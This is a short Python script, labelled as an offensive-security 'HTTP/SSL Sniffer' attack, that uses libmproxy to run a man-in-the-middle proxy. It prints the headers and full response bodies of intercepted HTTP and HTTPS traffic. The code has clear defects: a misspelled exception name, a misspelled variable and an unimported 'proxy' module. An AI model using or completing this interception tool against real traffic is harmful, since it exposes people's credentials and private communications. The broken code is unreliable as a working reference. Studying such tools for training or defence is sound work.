# Offensive Security Software
# SSE Program
# Attack: HTTP/SSL Sniffer
# Date: January 31, 2016
# Description:

from libmproxy import controller

class Sniffer(controller.Master):
    def run(self):
        try:
            return controller.Master.run(self)
        except KeyboardInterrup:
            self.shutdown()

    def handle_request(self, request):
        print "Got request\n" + str(request.headers)
        request._ack()

    def handle_response(self, response):
        print "Got response\n" + str(response.headers)
        print response.content
        reponse._ack()


port = 1337
ssl_config = proxy.SSLConfig("private.pem")
proxy_server = proxy.ProxyServer(ssl_config, port)
m = Sniffer(proxy_server)

print "Running proxy on port " + str(port)
m.run()
